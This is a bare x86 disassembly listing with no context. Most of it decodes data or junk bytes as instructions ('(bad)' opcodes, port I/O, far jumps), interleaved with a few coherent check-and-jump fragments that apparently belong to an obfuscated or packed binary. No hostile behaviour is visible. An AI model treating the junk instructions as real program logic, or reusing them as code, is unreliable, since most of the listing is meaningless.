  4018e4:	mov    ecx,0x432bb7f6
  4018e9:	out    dx,eax
  4018ea:	sbb    BYTE PTR [ecx+0x49],al
  4018ed:	arpl   WORD PTR [ebp+0x1568b1f5],sp
  4018f3:	scas   al,BYTE PTR es:[edi]
  4018f4:	repz (bad) 
  4018f6:	xor    bl,ah
  4018f8:	hlt    
  4018f9:	pop    eax
  4018fa:	cmc    
  4018fb:	inc    edx
  4018fc:	jecxz  0x4018e3
  4018fe:	loop   0x4018fd
  401900:	loopne 0x401928
  401902:	mov    bh,0xa8
  401904:	mov    eax,0xeb22b556
  401909:	jecxz  0x4018b6
  40190b:	pop    esp
  40190c:	push   esp
  40190d:	and    al,0x30
  40190f:	or     DWORD PTR ds:0x87deafa8,esi
  401915:	sub    esp,DWORD PTR [edi+0x47dfd163]
  40191b:	pop    esp
  40191c:	loope  0x401955
  40191e:	test   eax,0xe6b18c85
  401923:	cmp    BYTE PTR [edi-0x6776fffa],ah
  401929:	xchg   esp,eax
  40192a:	mov    cl,0x50
  40192c:	mov    dl,0x3f
  40192e:	ins    DWORD PTR es:[edi],dx
  40192f:	cdq    
  401930:	xchg   DWORD PTR [ebx-0x6c],ebp
  401933:	rcr    DWORD PTR [eax+0x79b62f61],1
  401939:	lods   al,BYTE PTR ds:[esi]
  40193a:	jae    0x4019ba
  40193c:	mov    esp,0x6b184211
  401941:	enter  0x6fb4,0x76
  401945:	sti    
  401946:	popf   
  401947:	mov    gs,WORD PTR [edx-0x7658ef62]
  40194d:	inc    ebp
  40194e:	in     al,0x8b
  401950:	inc    ebp
  401951:	in     al,0xc7
  401953:	add    BYTE PTR [ecx-0x740760d3],ch
  401959:	inc    ebp
  40195a:	in     al,dx
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0x487bf628
  401994:	in     eax,dx
  401995:	cmp    bl,bh
  401997:	jo     0x401a13
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	mov    eax,ds:0x2d147e17
  4019a4:	ins    BYTE PTR es:[edi],dx
  4019a5:	imul   edi,DWORD PTR [ebp-0x60],0xfffffff0
  4019a9:	xchg   esi,eax
  4019aa:	mov    ch,0x25
  4019ac:	scas   al,BYTE PTR es:[edi]
  4019ad:	inc    edx
  4019ae:	enter  0x68e1,0x96
  4019b2:	retf   0xd350
  4019b5:	out    0xd8,al
  4019b7:	hlt    
  4019b8:	sbb    DWORD PTR [esi-0x54],ebx
  4019bb:	in     al,0x6c
  4019bd:	out    dx,al
  4019be:	out    dx,eax
  4019bf:	jecxz  0x4019c7
  4019c1:	test   al,0x75
  4019c3:	adc    ecx,0x46944e02
  4019c9:	in     eax,dx
  4019ca:	adc    eax,0x9a104ce3
  4019cf:	in     al,dx
  4019d0:	pop    esi
  4019d1:	jmp    0xff7:0x6a0a096f
  4019d8:	xchg   ebp,eax
  4019d9:	jns    0x4019af
  4019db:	push   eax
  4019dc:	jl     0x4019ad
  4019de:	mov    esi,0x1b5ab49c
  4019e3:	jmp    0x5451:0x5a2faa8c
  4019ea:	std    
  4019eb:	test   BYTE PTR [edx-0x6a],ah
  4019ee:	mov    cl,0x15
  4019f0:	ror    BYTE PTR [ebx+0x40e8d6f6],1
  4019f6:	pop    eax
  4019f7:	push   esi
  4019f8:	in     eax,0x8b
  4019fa:	ror    BYTE PTR [ecx-0x4b],1
  4019fd:	inc    edi
  4019fe:	adc    DWORD PTR [ebp-0x63],esp
  401a01:	ret    
  401a02:	push   cs
  401a03:	gs push 0x65
  401a06:	or     al,0x4
  401a08:	scas   al,BYTE PTR es:[edi]
  401a09:	iret   
  401a0a:	jle    0x4019de
  401a0c:	mov    DWORD PTR [edi+ecx*2-0x3780559],edi
  401a13:	xor    BYTE PTR ds:0xd1f23c40,ch
  401a19:	sbb    DWORD PTR ds:0x9229aa81,esp
  401a1f:	mov    DWORD PTR [eax+eiz*8+0x4820abf1],ebp
  401a26:	fs out dx,al
  401a28:	mov    ds,WORD PTR [edx]
  401a2a:	inc    ecx
  401a2b:	into   
  401a2c:	adc    bl,cl
  401a2e:	ins    BYTE PTR es:[edi],dx
  401a2f:	adc    BYTE PTR ds:[eax+0x4879c083],ch
  401a36:	cmp    DWORD PTR [esi-0x665d9b79],ecx
  401a3c:	push   ecx
  401a3d:	mov    edi,0x3eeaa618
  401a42:	jno    0x4019e6
  401a44:	dec    ebp
  401a45:	lods   al,BYTE PTR ds:[esi]
  401a46:	ret    0xafff
  401a49:	(bad)
  401a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a4d:	(bad)  
  401a4e:	push   ss
  401a4f:	mov    cl,0x5e
  401a51:	and    BYTE PTR [edx+0x3f],cl
  401a54:	bound  ebp,QWORD PTR [ecx+0x6b]
  401a57:	mov    edx,0xe20147ac
  401a5c:	fnstenv ds:0x22b2af5
  401a62:	loopne 0x4019f8
  401a64:	outs   dx,DWORD PTR ds:[esi]
  401a65:	test   DWORD PTR [ebx+ebp*8+0x66e2099e],ebp
  401a6c:	lea    eax,[esi+0x16]
  401a6f:	inc    esi
  401a70:	cmc    
  401a71:	push   0x4fc9130e
  401a76:	loopne 0x401a2e
  401a78:	aaa    
  401a79:	push   DWORD PTR [edx+0x23]
  401a7c:	push   ebx
  401a7d:	jl     0x401ab2
  401a7f:	jle    0x401aa1
  401a81:	aas    
  401a82:	(bad)  
  401a83:	into   
  401a84:	shr    esi,cl
  401a86:	jl     0x401a48
  401a88:	mov    ds:0x6126d32f,eax
  401a8d:	pop    esp
  401a8e:	fcmovnu st,st(0)
  401a90:	xchg   esi,eax
  401a91:	ja     0x401af1
  401a93:	cmp    al,ch
  401a95:	(bad)  
  401a96:	push   esi
  401a97:	int3   
  401a98:	sbb    dh,BYTE PTR ds:0xe04977c2
  401a9e:	cwde   
  401a9f:	and    eax,0xc253143e
  401aa4:	sub    BYTE PTR [esi+0x579bea87],dh
  401aaa:	leave  
  401aab:	push   ebp
  401aac:	dec    ecx
  401aad:	or     bl,ah
  401aaf:	jbe    0x401a50
  401ab1:	inc    edx
  401ab2:	pop    ds
  401ab3:	in     al,0xa8
  401ab5:	push   0x6f2564d
  401aba:	mov    dl,BYTE PTR [esi+0x41b32900]
  401ac0:	xchg   esi,eax
  401ac1:	or     dl,BYTE PTR [esi-0x556a8d7d]
  401ac7:	in     al,dx
  401ac8:	inc    edi
  401ac9:	in     al,0x30
  401acb:	add    al,0xcb
  401acd:	popa   
  401ace:	push   edi
  401acf:	mov    ?,edi
  401ad1:	xor    edi,edi
  401ad3:	mov    ds:0xf2931c58,eax
  401ad8:	xor    DWORD PTR [eax+0x15],edx
  401adb:	mov    bl,0xae
  401add:	sbb    al,0x15
  401adf:	in     eax,dx
  401ae0:	xchg   esp,eax
  401ae1:	sub    al,0x1c
  401ae3:	push   eax
  401ae4:	mov    eax,ds:0x5139ecfc
  401ae9:	adc    al,0xcb
  401aeb:	cmc    
  401aec:	cmp    ah,BYTE PTR [esi]
  401aee:	outs   dx,DWORD PTR ds:[esi]
  401aef:	jecxz  0x401b46
  401af1:	dec    edi
  401af2:	popf   
  401af3:	add    BYTE PTR [edx-0x5e],bh
  401af6:	mov    cs,WORD PTR [edi+0x65]
  401af9:	shr    DWORD PTR [edi],cl
  401afb:	les    eax,FWORD PTR [edi+0x7ff9c440]
  401b01:	cmp    al,0xad
  401b03:	sbb    al,0xd6
  401b05:	inc    ebx
  401b06:	xor    al,0xfe
  401b08:	fneni(8087 only) 
  401b0a:	into   
  401b0b:	enter  0xde7f,0x17
  401b0f:	xchg   esp,eax
  401b10:	ins    DWORD PTR es:[edi],dx
  401b11:	lea    edx,[eax+0xb]
  401b14:	mov    esi,0xfff2a57a
  401b19:	push   esp
  401b1a:	es lock inc ebx
  401b1d:	pop    edi
  401b1e:	jmp    0xca7e:0x17f6d505
  401b25:	cmp    eax,0xf6e71e25
  401b2a:	outs   dx,BYTE PTR ds:[esi]
  401b2b:	push   ebx
  401b2c:	fsubr  QWORD PTR [ecx-0x69]
  401b2f:	jmp    0x401b80
  401b31:	mov    dh,0xd9
  401b33:	fisttp QWORD PTR [edx]
  401b35:	loop   0x401b40
  401b37:	jbe    0x401b00
  401b39:	mov    eax,ds:0x95bd0c08
  401b3e:	fsubr  QWORD PTR [edi+0x609c60ab]
  401b44:	mov    ss,WORD PTR [ebx-0x4fdcee0c]
  401b4a:	xchg   bh,bh
  401b4c:	pop    edx
  401b4d:	mov    ecx,0x6b718714
  401b52:	dec    edx
  401b53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b54:	mov    eax,DWORD PTR [edi]
  401b56:	int    0x61
  401b58:	inc    ebx
  401b59:	push   esi
  401b5a:	sub    BYTE PTR [edi+0x3165c4ca],cl
  401b60:	ds into 
  401b62:	(bad)  
  401b63:	test   al,0xa4
  401b65:	jp     0x401b8a
  401b67:	mov    al,0x26
  401b69:	mov    dh,BYTE PTR [eax-0x806fc80]
  401b6f:	jecxz  0x401b8a
  401b71:	mov    WORD PTR [ebp-0x58],gs
  401b74:	pusha  
  401b75:	mov    esp,0xe7849275
  401b7a:	sbb    eax,0x3499c19e
  401b7f:	sub    edi,DWORD PTR [ebx-0x12]
  401b82:	mov    dl,BYTE PTR [esi]
  401b84:	xor    al,0x63
  401b86:	outs   dx,BYTE PTR ds:[esi]
  401b87:	inc    eax
  401b88:	scas   al,BYTE PTR es:[edi]
  401b89:	jp     0x401b31
  401b8b:	fs push es
  401b8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b8e:	mov    ecx,0xdb7fba56
  401b93:	lods   al,BYTE PTR ds:[esi]
  401b94:	mov    eax,0xd6d14af4
  401b99:	sbb    eax,DWORD PTR [ebp+esi*2-0x74237a42]
  401ba0:	inc    ebp
  401ba1:	lock mov edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    bl,BYTE PTR [eax]
  401bdd:	push   cs
  401bde:	cmc    
  401bdf:	mov    bl,0x70
  401be1:	js     0x401c53
  401be3:	jo     0x401c55
  401be5:	jle    0x401c57
  401be7:	jo     0x401b6b
  401be9:	dec    edx
  401bea:	cmp    DWORD PTR [ebp+0x4f63ebe],esp
  401bf0:	repz in eax,dx
  401bf2:	std    
  401bf3:	aad    0xb7
  401bf5:	shl    BYTE PTR [esi],cl
  401bf7:	out    dx,al
  401bf8:	xchg   ebx,eax
  401bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bfa:	lods   eax,DWORD PTR ds:[esi]
  401bfb:	aas    
  401bfc:	xchg   edi,eax
  401bfd:	repnz icebp 
  401bff:	pop    eax
  401c00:	test   eax,0x264886b6
  401c05:	imul   ecx,DWORD PTR [eax-0x537cbf77],0x3d5e029
  401c0f:	fwait
  401c10:	imul   edx,DWORD PTR [ecx+0x6539d0f6],0xa8a5239a
  401c1a:	imul   ecx,DWORD PTR [edx],0xffffff90
  401c1d:	mov    cl,BYTE PTR [ebx+0x5a651088]
  401c23:	mov    BYTE PTR [ebx+0x6b],dl
  401c26:	es push edi
  401c28:	xor    BYTE PTR [esi+0x13c52e54],ah
  401c2e:	adc    DWORD PTR [eax+0x4f],ebx
  401c31:	mov    cl,al
  401c33:	mov    cl,0x51
  401c35:	mov    ch,0xf3
  401c37:	lods   al,BYTE PTR ds:[esi]
  401c38:	jp     0x401be9
  401c3a:	and    dh,BYTE PTR [edx]
  401c3c:	dec    ecx
  401c3d:	and    esi,ebp
  401c3f:	push   eax
  401c40:	mov    edi,0x73f87b3b
  401c45:	xchg   BYTE PTR [esi-0x22e6b6a2],ah
  401c4b:	push   ecx
  401c4c:	push   0x55
  401c4e:	fwait
  401c4f:	das    
  401c50:	mov    al,ds:0xd0318cb9
  401c55:	inc    esp
  401c56:	xor    ch,al
  401c58:	jmp    0x401ccb
  401c5a:	jne    0x401c62
  401c5c:	test   eax,0xc0aa803b
  401c61:	jmp    0x88ee:0x39c3e2fc
  401c68:	ins    DWORD PTR es:[edi],dx
  401c69:	call   0xdc87:0x370f
  401c6f:	xor    DWORD PTR [esi-0x50],esi
  401c72:	xor    BYTE PTR [eax],dl
  401c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c75:	inc    ebx
  401c76:	gs push ds
  401c78:	test   al,0xcb
  401c7a:	sti    
  401c7b:	push   0xf
  401c7d:	lea    ebp,[edx+0x5785001b]
  401c83:	and    BYTE PTR [eax+0x78],0x97
  401c87:	or     esp,DWORD PTR [ecx]
  401c89:	cli    
  401c8a:	mov    eax,ds:0x51b96e93
  401c8f:	and    eax,0xef881ced
  401c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c95:	push   cs
  401c96:	and    ebx,esp
  401c98:	std    
  401c99:	pop    ss
  401c9a:	scas   al,BYTE PTR es:[edi]
  401c9b:	ror    DWORD PTR [ecx+0x1df00c3c],1
  401ca1:	inc    eax
  401ca2:	pop    ds
  401ca3:	push   edi
  401ca4:	fs mov edx,0x39d65789
  401caa:	dec    eax
  401cab:	stc    
  401cac:	shl    BYTE PTR [esi],1
  401cae:	fadd   st(0),st
  401cb0:	sub    al,0x1e
  401cb2:	(bad)  
  401cb3:	ds and eax,0xb63bb684
  401cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cba:	ret    
  401cbb:	sar    DWORD PTR ds:0xdc921b56,0x73
  401cc2:	sbb    al,0xb0
  401cc4:	mov    WORD PTR [edi],ds
  401cc6:	lods   eax,DWORD PTR ds:[esi]
  401cc7:	fxch   st(2)
  401cc9:	push   ebx
  401cca:	pop    edi
  401ccb:	int3   
  401ccc:	fwait
  401ccd:	shl    BYTE PTR ds:0x7d82f6e6,cl
  401cd3:	mov    DWORD PTR [ebx+eax*4-0x8],edx
  401cd7:	cmp    esi,DWORD PTR [ebp-0x11]
  401cda:	dec    ebx
  401cdb:	inc    edx
  401cdc:	repnz cmp BYTE PTR [ebx-0x15220c15],ah
  401ce3:	xor    DWORD PTR [ecx+0x4aa5f236],edx
  401ce9:	mov    esp,DWORD PTR [edi-0x69]
  401cec:	push   ecx
  401ced:	mov    dl,0xac
  401cef:	adc    al,0xa3
  401cf1:	add    eax,0xc7984119
  401cf6:	jo     0x401d6d
  401cf8:	into   
  401cf9:	pop    esp
  401cfa:	jnp    0x401d46
  401cfc:	mov    cl,0x26
  401cfe:	mov    edx,0xace927eb
  401d03:	inc    esp
  401d04:	fdiv   st(5),st
  401d06:	retf   
  401d07:	loop   0x401d52
  401d09:	adc    al,BYTE PTR [esi+edx*8]
  401d0c:	retf   0xf8f6
  401d0f:	out    dx,eax
  401d10:	xchg   esp,eax
  401d11:	outs   dx,DWORD PTR ds:[esi]
  401d12:	mov    BYTE PTR [edx],bl
  401d14:	jnp    0x401d5e
  401d16:	jmp    0x1454f374
  401d1b:	pop    ebp
  401d1c:	int    0xf0
  401d1e:	mov    edi,0x54ea2707
  401d23:	fs enter 0xf011,0x34
  401d28:	out    0xfb,al
  401d2a:	dec    edx
  401d2b:	imul   ebp,DWORD PTR [edx+0x72caf739],0xffffffa8
  401d32:	loope  0x401cb5
  401d34:	inc    esp
  401d35:	loop   0x401d7f
  401d37:	mov    ebx,0x25d32e7d
  401d3c:	imul   ebx,DWORD PTR [esp+edx*8+0x3b],0x33fa94ac
  401d44:	outs   dx,BYTE PTR ds:[esi]
  401d45:	aaa    
  401d46:	aas    
  401d47:	rcl    BYTE PTR [ebx],cl
  401d49:	stc    
  401d4a:	mov    eax,ds:0x6b8aa8
  401d4f:	mov    ds,WORD PTR ds:0x77a0f9
  401d55:	dec    edx
  401d56:	daa    
  401d57:	sub    dl,BYTE PTR [edx+0x494aeb7]
  401d5d:	mov    DWORD PTR [ecx+esi*1+0x41e143d5],ecx
  401d64:	sbb    esi,ebp
  401d66:	imul   edi,esp,0x774546ac
  401d6c:	sub    BYTE PTR [edi-0x27],0x29
  401d70:	jle    0x401d0d
  401d72:	out    0xec,al
  401d74:	and    DWORD PTR [edi+0x6b],eax
  401d77:	jb     0x401d1f
  401d79:	dec    ecx
  401d7a:	fwait
  401d7b:	out    0xa5,al
  401d7d:	fistp  DWORD PTR [eax+esi*1]
  401d80:	jne    0x401dc7
  401d82:	cs (bad) 
  401d84:	and    BYTE PTR [edx+0x5d2c0d2d],al
  401d8a:	sbb    al,0x82
  401d8c:	mov    eax,ds:0xb9dbf9ef
  401d91:	retf   
  401d92:	pop    edi
  401d93:	inc    BYTE PTR [ebp+0x532cdf07]
  401d99:	xor    esi,edx
  401d9b:	int3   
  401d9c:	sub    ecx,DWORD PTR [ebx-0x7b]
  401d9f:	sub    al,0x26
  401da1:	jmp    0x401dea
  401da3:	cmp    esi,esi
  401da5:	mov    BYTE PTR [ebx+eax*2],0x9f
  401da9:	fs repnz sub eax,0x23352f46
  401db0:	stc    
  401db1:	or     al,0xdd
  401db3:	addr16 mov esp,0x722b4d97
  401db9:	outs   dx,DWORD PTR ds:[esi]
  401dba:	gs call 0x8cb2ae01
  401dc0:	sub    al,0xbd
  401dc2:	push   esi
  401dc3:	cdq    
  401dc4:	mov    edi,0x62c55697
  401dc9:	loop   0x401dbb
  401dcb:	int    0x57
  401dcd:	cmp    bl,bh
  401dcf:	mov    eax,0xeacdb9b1
  401dd4:	sub    BYTE PTR [edx+0x424698d3],bh
  401dda:	and    DWORD PTR [edx+0x30],esp
  401ddd:	inc    edi
  401dde:	mov    dh,0x4d
  401de0:	lods   al,BYTE PTR ds:[esi]
  401de1:	test   eax,0xfbe1ebaa
  401de6:	ret    0x3a9
  401de9:	inc    ebp
  401dea:	call   0xca949b2c
  401def:	ins    BYTE PTR es:[edi],dx
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [edi+eiz*2-0x34],dl
  401e44:	dec    esi
  401e45:	pop    ebx
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	add    BYTE PTR [edx-0x1466dd3],cl
  401e54:	adc    DWORD PTR [ebx],esi
  401e56:	sub    BYTE PTR ds:0x41662bde,0x8b
  401e5d:	repnz div DWORD PTR [ebx-0x55de1dc8]
  401e64:	adc    eax,0x657e8ceb
  401e69:	jl     0x401e9f
  401e6b:	push   ds
  401e6c:	add    ecx,DWORD PTR [edx+0x1c5759fa]
  401e72:	pop    esi
  401e73:	fisttp DWORD PTR [eax]
  401e75:	inc    ebx
  401e76:	retf   0x1329
  401e79:	test   DWORD PTR [edi],esp
  401e7b:	sti    
  401e7c:	mov    esi,0x1b887087
  401e81:	mov    si,ds
  401e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e85:	pop    eax
  401e86:	outs   dx,DWORD PTR ds:[esi]
  401e87:	fld    QWORD PTR [ecx]
  401e89:	das    
  401e8a:	adc    eax,0x326959ea
  401e8f:	xor    DWORD PTR [eax],edi
  401e91:	sub    al,0x44
  401e93:	call   0xb0f6:0x2195c0bf
  401e9a:	add    al,0xc6
  401e9c:	push   ss
  401e9d:	stc    
  401e9e:	addr16 sbb ebx,ecx
  401ea1:	dec    BYTE PTR [ebx*8-0x5c086a14]
  401ea8:	xor    ah,BYTE PTR [ebp-0x78f641a1]
  401eae:	dec    ecx
  401eaf:	or     al,0x80
  401eb1:	lods   eax,DWORD PTR ds:[esi]
  401eb2:	pop    ebx
  401eb3:	push   es
  401eb4:	test   al,0x1b
  401eb6:	pop    ecx
  401eb7:	push   ebp
  401eb8:	mov    edx,0x1c723d44
  401ebd:	jnp    0x401f2e
  401ebf:	or     DWORD PTR [edx+0x29cb8d03],esi
  401ec5:	cs int 0x57
  401ec8:	stc    
  401ec9:	mov    edi,0x2f37e037
  401ece:	arpl   si,dx
  401ed0:	mov    DWORD PTR [ebp+0x2b],ebp
  401ed3:	shl    ebx,cl
  401ed5:	stos   DWORD PTR es:[edi],eax
  401ed6:	sbb    bh,BYTE PTR [ecx+ebp*1+0x602e301e]
  401edd:	iret   
  401ede:	neg    DWORD PTR [esi]
  401ee0:	mov    eax,ds:0x7df9054c
  401ee5:	in     eax,dx
  401ee6:	lea    ebp,[esi+esi*8]
  401ee9:	sbb    dl,BYTE PTR [ebx]
  401eeb:	and    dl,BYTE PTR [eax+edx*2-0x7a]
  401eef:	push   ds
  401ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ef1:	jbe    0x401f33
  401ef3:	daa    
  401ef4:	or     ah,bh
  401ef6:	or     eax,0x59598263
  401efb:	inc    ebx
  401efc:	sub    al,0xca
  401efe:	cmp    BYTE PTR ds:0xcdce3b77,0xf7
  401f05:	rol    BYTE PTR [ecx+0x43bc6877],0xb2
  401f0c:	std    
  401f0d:	mov    ss:0x2ae91abd,al
  401f13:	jmp    0xe3a8:0xf5614221
  401f1a:	mov    bh,0xf7
  401f1c:	(bad)  
  401f1d:	mov    ecx,0x28d43887
  401f22:	add    eax,0x27b2df9b
  401f27:	int    0x90
  401f29:	aad    0xfb
  401f2b:	stos   BYTE PTR es:[edi],al
  401f2c:	iret   
  401f2d:	inc    ebx
  401f2e:	cmp    DWORD PTR [edx],0xffffffe8
  401f31:	test   al,0x81
  401f33:	xor    BYTE PTR [edx-0x3e],dl
  401f36:	popf   
  401f37:	lea    ebx,[ecx+0x5f]
  401f3a:	push   ebx
  401f3b:	pop    ss
  401f3c:	shr    BYTE PTR [eax+0x2d8238ef],0xbe
  401f43:	mov    edi,0xfca60511
  401f48:	ja     0x401f53
  401f4a:	jle    0x401f60
  401f4c:	xchg   ecx,eax
  401f4d:	add    al,0xed
  401f4f:	mov    ch,BYTE PTR [eax]
  401f51:	xchg   edi,eax
  401f52:	adc    eax,0xc22a376b
  401f57:	addr16 jmp 0x401fbb
  401f5a:	sbb    cl,BYTE PTR [ebx-0x5f]
  401f5d:	inc    esp
  401f5e:	sbb    BYTE PTR [ecx+0x78],bl
  401f61:	dec    ebp
  401f62:	adc    cl,BYTE PTR [edi+0x52e32191]
  401f68:	les    ebp,FWORD PTR [edx-0x3]
  401f6b:	mov    bh,0x26
  401f6d:	push   esi
  401f6e:	je     0x401fd1
  401f70:	fidiv  WORD PTR [eax+0x8]
  401f73:	xchg   BYTE PTR [ebx+ebx*4-0x56],al
  401f77:	push   es
  401f78:	std    
  401f79:	mov    dl,0xa8
  401f7b:	out    dx,al
  401f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f7d:	xchg   ebx,eax
  401f7e:	adc    dh,al
  401f80:	push   ebp
  401f81:	and    dl,BYTE PTR [edx]
  401f83:	add    esi,DWORD PTR [ebx]
  401f85:	or     dh,ah
  401f87:	sbb    DWORD PTR ds:0x210f5c07,0xffffffae
  401f8e:	xchg   esp,eax
  401f8f:	adc    ebx,DWORD PTR [eax]
  401f91:	stos   BYTE PTR es:[edi],al
  401f92:	mov    ds:0x59b90134,al
  401f97:	dec    ebx
  401f98:	xor    ah,BYTE PTR [ebx]
  401f9a:	test   al,0x49
  401f9c:	cmp    edx,ebx
  401f9e:	sub    eax,0x1c34320
  401fa3:	jmp    0x401f25
  401fa5:	cdq    
  401fa6:	xchg   edx,eax
  401fa7:	stos   BYTE PTR es:[edi],al
  401fa8:	add    edx,esi
  401faa:	scas   eax,DWORD PTR es:[edi]
  401fab:	stc    
  401fac:	cmp    BYTE PTR [ebx-0x7e],cl
  401faf:	inc    edi
  401fb0:	inc    ebx
  401fb1:	mov    cl,0x6e
  401fb3:	mov    dl,0x1c
  401fb5:	sbb    eax,0x825f4e1f
  401fba:	adc    BYTE PTR [ecx],bl
  401fbc:	push   esp
  401fbd:	hlt    
  401fbe:	pop    es
  401fbf:	push   ds
  401fc0:	xchg   BYTE PTR [ebp-0x4411550d],bl
  401fc6:	in     al,0x2d
  401fc8:	outs   dx,DWORD PTR ds:[esi]
  401fc9:	push   ds
  401fca:	rcl    BYTE PTR [ecx],cl
  401fcc:	inc    esi
  401fcd:	xchg   ebp,eax
  401fce:	cmp    ch,BYTE PTR [eax+ebp*2-0x55e67ced]
  401fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fd6:	jle    0x402020
  401fd8:	lods   eax,DWORD PTR ds:[esi]
  401fd9:	jb     0x401fa9
  401fdb:	mov    cs,WORD PTR [edx]
  401fdd:	cmp    BYTE PTR [ecx+0x3d97e84e],ah
  401fe3:	jne    0x402060
  401fe5:	lock cmp eax,0x6994a28e
  401feb:	shl    DWORD PTR [ebp-0x56],0xa1
  401fef:	adc    DWORD PTR [ecx],esi
  401ff1:	and    al,0x5
  401ff3:	push   edx
  401ff4:	mov    cl,0x18
  401ff6:	dec    edx
  401ff7:	inc    BYTE PTR [ecx+0x6d]
  401ffa:	loopne 0x401f9e
  401ffc:	jns    0x401fb3
  401ffe:	sti    
  401fff:	sub    BYTE PTR [eax+0x45269e9e],dh
  402005:	sti    
  402006:	neg    BYTE PTR [eax-0x1d]
  402009:	and    ah,BYTE PTR [ecx+ebp*8]
  40200c:	pop    edx
  40200d:	fistp  WORD PTR [ebx]
  40200f:	outs   dx,BYTE PTR ds:[esi]
  402010:	adc    ebx,DWORD PTR [esi+0x4836f9e3]
  402016:	inc    ebp
  402017:	mov    bl,0x2
  402019:	inc    esp
  40201a:	test   BYTE PTR [eax-0x486ce29],ah
  402020:	sbb    DWORD PTR cs:[edx+0x3f],ebx
  402024:	or     eax,0x139fe870
  402029:	aad    0xea
  40202b:	xor    eax,0x1eca1af5
  402030:	sbb    eax,0x97389611
  402035:	test   BYTE PTR [ecx+eiz*8+0x21975c36],dh
  40203c:	add    al,0xdb
  40203e:	pop    ebx
  40203f:	adc    bh,BYTE PTR [ebx+edi*2]
  402042:	jnp    0x401fec
  402044:	push   es
  402045:	inc    esi
  402046:	dec    edx
  402047:	out    0x59,eax
  402049:	int3   
  40204a:	ret    0x6f9b
  40204d:	mov    bh,0x8b
  40204f:	push   ebp
  402050:	fmul   DWORD PTR [ebx-0x38fc99ee]
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	cmp    BYTE PTR ds:0x70fde1e0,0x4
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	add    bh,BYTE PTR [edx+0x3d4ba1e9]
  40207c:	pop    ecx
  40207d:	int3   
  40207e:	fcmovnb st,st(0)
  402080:	mov    al,BYTE PTR [eax-0x7755e1]
  402086:	push   ebp
  402087:	and    edx,esi
  402089:	(bad)  
  40208b:	mov    BYTE PTR [eax+0x5becd44],dh
  402091:	mov    esp,0x9e570855
  402096:	out    0x14,al
  402098:	in     al,0x94
  40209a:	dec    esi
  40209b:	xor    eax,0x6236c9a0
  4020a0:	les    esi,FWORD PTR ds:0x9cf9aa62
  4020a6:	push   ss
  4020a7:	cmp    BYTE PTR ds:0x27d1226d,0x33
  4020ae:	ss or  eax,0x7c3d737
  4020b4:	imul   esi,DWORD PTR [edi+0x41414cf6],0x127643bb
  4020be:	stos   BYTE PTR es:[edi],al
  4020bf:	fidivr DWORD PTR [eax-0x48eaa99e]
  4020c5:	mov    eax,ds:0x974fbbbe
  4020ca:	inc    ecx
  4020cb:	mov    ah,0xaa
  4020cd:	stos   DWORD PTR es:[edi],eax
  4020ce:	inc    edx
  4020cf:	(bad)  
  4020d0:	popf   
  4020d1:	je     0x4020f3
  4020d3:	push   ecx
  4020d4:	call   0xfd9:0xaf96381d
  4020db:	pop    eax
